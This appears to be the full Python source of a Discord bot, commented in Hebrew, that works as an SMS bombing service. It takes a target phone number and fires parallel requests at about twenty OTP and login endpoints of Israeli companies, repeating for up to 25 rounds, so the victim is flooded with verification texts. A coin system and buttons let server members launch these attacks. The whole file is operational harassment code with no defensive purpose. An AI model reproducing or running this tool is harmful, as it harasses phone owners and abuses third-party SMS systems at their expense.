import discord
from discord import app_commands
import aiohttp
import asyncio
import os
import time
import logging
import json

# הגדרת לוגים לצפייה בביצועים ב-Railway Console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger('CyberIL-Ultra')

# נתונים מ-Railway Variables
TOKEN = os.getenv("BOT_TOKEN")
APPLICATION_ID = os.getenv("CLIENT_ID")

class SpammerBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True 
        super().__init__(intents=intents, application_id=APPLICATION_ID)
        self.tree = app_commands.CommandTree(self)
        
        # דאטה בזיכרון (מתאפס בריסטארט של Railway)
        self.user_tokens = {}
        self.user_cooldowns = {}
        self.active_attacks = set()

    async def setup_hook(self):
        logger.info("🔄 מסנכרן פקודות גלובליות...")
        await self.tree.sync()
        logger.info("✅ המערכת מוכנה לפעולה!")

bot = SpammerBot()

# ════════════════════════════════════════
#   מנוע ה-API האגרסיבי (V3 - Ultra Engine)
# ════════════════════════════════════════

async def fetch_api(session, target, phone):
    """מבצע בקשה בודדת מול ה-API עם טיפול גמיש בנתונים"""
    url = target["url"].replace("{{phone}}", phone)
    method = target.get("method", "POST").upper()
    headers = target.get("headers", {})
    
    # עיבוד JSON במידה וקיים
    json_payload = None
    if "json" in target:
        json_str = json.dumps(target["json"]).replace("{{phone}}", phone)
        json_payload = json.loads(json_str)

    # עיבוד Params (עבור בקשות GET)
    params_payload = None
    if "params" in target:
        params_str = json.dumps(target["params"]).replace("{{phone}}", phone)
        params_payload = json.loads(params_str)

    try:
        async with session.request(
            method, 
            url, 
            json=json_payload, 
            params=params_payload, 
            headers=headers, 
            timeout=5
        ) as resp:
            return resp.status
    except:
        return None

async def run_elite_round(phone):
    """מפעיל את כל עשרות המקורות בבת אחת בסנכרון מלא"""
    phone_no_zero = phone[1:] if phone.startswith('0') else phone
    
    async with aiohttp.ClientSession() as session:
        # רשימת המטרות המאוחדת (כל מה ששלחת עד עכשיו)
        targets = [
            # OTP Specialists & SMS Services
            {"url": "https://019sms.co.il/api", "method": "POST", "json": {"send_otp": {"user": {"username": "test", "phone": phone, "app_id": 1, "source": "BOM" }}}},
            {"url": "https://api.globalsms.co.il/send", "method": "POST", "json": {"phone": phone, "message": "BOM"}},
            {"url": "https://smsim.co.il/api/sms", "method": "POST", "json": {"to": phone, "text": "BOM"}},
            {"url": "https://www.sms4free.co.il/api/send", "method": "GET", "params": {"phone": phone, "msg": "BOM"}},
            {"url": "https://api.activetrail.co.il/sms", "method": "POST", "json": {"phone": phone}},
            
            # Big Apps (Israel)
            {"url": "https://api.yad2.co.il/auth/sms", "method": "POST", "json": {"phone": phone, "service": "login"}},
            {"url": "https://api.paybox.co.il/auth/otp/send", "method": "POST", "json": {"phone": phone, "action": "verify"}},
            {"url": "https://restaurant-api.wolt.com/v1/auth/sms", "method": "POST", "json": {"phone_number": f"+972{phone_no_zero}"}},
            {"url": "https://api.tenbis.co.il/auth/otp", "method": "POST", "json": {"phone": phone, "type": "sms"}},
            {"url": "https://api.storerocket.io/v1/auth/sms", "method": "POST", "json": {"phoneNumber": phone, "locale": "he"}},
            
            # Fintech & Services
            {"url": "https://auth.riseup.co.il/v1/sms", "method": "POST", "json": {"msisdn": phone, "type": "otp"}},
            {"url": "https://api.tarya.co.il/auth/sms", "method": "POST", "json": {"phone_number": phone}},
            {"url": "https://api.papaya.global/auth/sms", "method": "POST", "json": {"phone": f"+972{phone_no_zero}"}},
            {"url": "https://api.riskified.com/auth/otp", "method": "POST", "json": {"phone": phone}},
            {"url": "https://api.gc.co.il/v2/sms/verify", "method": "POST", "json": {"phone": phone}},
            
            # Additional Sources
            {"url": "https://auth.madlan.co.il/otp/send", "method": "POST", "json": {"phone": phone}},
            {"url": "https://api.homely.co.il/v1/auth/sms", "method": "POST", "json": {"mobile": phone}},
            {"url": "https://topmarket.co.il/api/sms/otp", "method": "POST", "json": {"phone": f"972{phone_no_zero}"}},
            {"url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": phone, "type": "phone", "projectId": "1"}},
            {"url": "https://api.monday.com/v2", "method": "POST", "json": {"query": f'mutation{{sms{{phone:"{phone}"}}}}'}},
            {"url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "json": {"phoneNumber": phone}}
        ]
        
        # שליחה מקבילית אגרסיבית
        tasks = [fetch_api(session, t, phone) for t in targets]
        results = await asyncio.gather(*tasks)
        logger.info(f"🚀 סבב ירי הסתיים: {len([r for r in results if r])}/{len(targets)} הצלחות על {phone}")

# ════════════════════════════════════════
#   ממשק המשתמש (Modals & Buttons)
# ════════════════════════════════════════

class BombingModal(discord.ui.Modal, title="⚡ SMS Elite Launcher"):
    phone = discord.ui.TextInput(label="מספר טלפון יעד", placeholder="05XXXXXXXX", min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label="כמות סיבובים (1-25)", default="5")

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value
        try:
            num_rounds = int(self.rounds.value)
        except:
            num_rounds = 1
        
        num_rounds = max(1, min(num_rounds, 25))
        uid = interaction.user.id
        
        await interaction.response.send_message(f"💣 **הפצצה אגרסיבית החלה!**\n🎯 יעד: `{phone_num}`\n🔄 סיבובים: `{num_rounds}`", ephemeral=True)
        bot.active_attacks.add(uid)

        for i in range(num_rounds):
            if uid not in bot.active_attacks or bot.user_tokens.get(uid, 0) < 1:
                break
            
            await run_elite_round(phone_num)
            bot.user_tokens[uid] -= 1
            await asyncio.sleep(1.2) # קצב אש גבוה מאוד

        if uid in bot.active_attacks:
            bot.active_attacks.remove(uid)
        await interaction.followup.send(f"✅ סיים הפצצה על {phone_num}.", ephemeral=True)

class ControlPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger, custom_id="btn_launch")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        tokens = bot.user_tokens.get(interaction.user.id, 0)
        if tokens < 5:
            return await interaction.response.send_message("❌ אין מטבעות!", ephemeral=True)
        await interaction.response.send_modal(BombingModal())

    @discord.ui.button(label="🎫 טוקן יומי", style=discord.ButtonStyle.success, custom_id="btn_daily")
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        if now - bot.user_cooldowns.get(uid, 0) < 86400:
            return await interaction.response.send_message("⏳ כבר לקחת!", ephemeral=True)
        
        bot.user_tokens[uid] = bot.user_tokens.get(uid, 0) + 120
        bot.user_cooldowns[uid] = now
        await interaction.response.send_message("✅ קיבלת 120 מטבעות.", ephemeral=True)

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in bot.active_attacks:
            bot.active_attacks.remove(interaction.user.id)
            await interaction.response.send_message("🛑 הפצצה הופסקה.", ephemeral=True)
        else:
            await interaction.response.send_message("אין תקיפה פעילה.", ephemeral=True)

# ════════════════════════════════════════
#   פקודות סלאש (/)
# ════════════════════════════════════════

@bot.tree.command(name="setup_spammer", description="הצגת פאנל הספאמר")
async def setup_spammer(interaction: discord.Interaction):
    tokens = bot.user_tokens.get(interaction.user.id, 0)
    embed = discord.Embed(
        title="⚡ CyberIL Elite SMS",
        description=f"יתרה: **{tokens}** מטבעות.\nמערכת הפצצה מבוססת Python Async.",
        color=discord.Color.red()
    )
    await interaction.response.send_message(embed=embed, view=ControlPanel())

@bot.tree.command(name="give_token", description="הענקת מטבעות (מנהל)")
@app_commands.checks.has_permissions(administrator=True)
async def give_token(interaction: discord.Interaction, user: discord.Member, amount: int):
    bot.user_tokens[user.id] = bot.user_tokens.get(user.id, 0) + amount
    await interaction.response.send_message(f"✅ הוספת {amount} מטבעות ל-{user.mention}.", ephemeral=True)

@bot.event
async def on_ready():
    logger.info(f"🤖 {bot.user.name} Online!")

if __name__ == "__main__":
    if not TOKEN:
        logger.critical("BOT_TOKEN MISSING")
    else:
        bot.run(TOKEN)
